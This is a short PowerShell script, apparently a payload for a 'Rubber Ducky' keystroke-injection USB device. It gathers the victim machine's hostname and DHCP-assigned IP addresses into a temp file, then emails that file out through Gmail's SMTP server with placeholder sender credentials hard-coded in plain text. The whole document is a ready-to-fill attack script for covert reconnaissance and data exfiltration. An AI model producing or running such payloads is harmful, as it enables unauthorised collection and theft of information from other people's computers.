cd $env:temp
$cmd = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP}
$cmd.InvokeReturnAsIs() | Out-File $env:temp/netinfo.txt -Append
Send-MailMessage -From "SENDER_EMAIL" -to 'RECEIVER_EMAIL' -Subject "Betreff" -Body 'Rubber-Ducky' -Attachments netinfo.txt -SmtpServer 'smtp.gmail.com' -Credential (New-Object PSCredential('SENDER_EMAIL',(ConvertTo-SecureString 'SENDER_PASSWORT' -AsPlainText -Force))) -UseSSL -Port 587 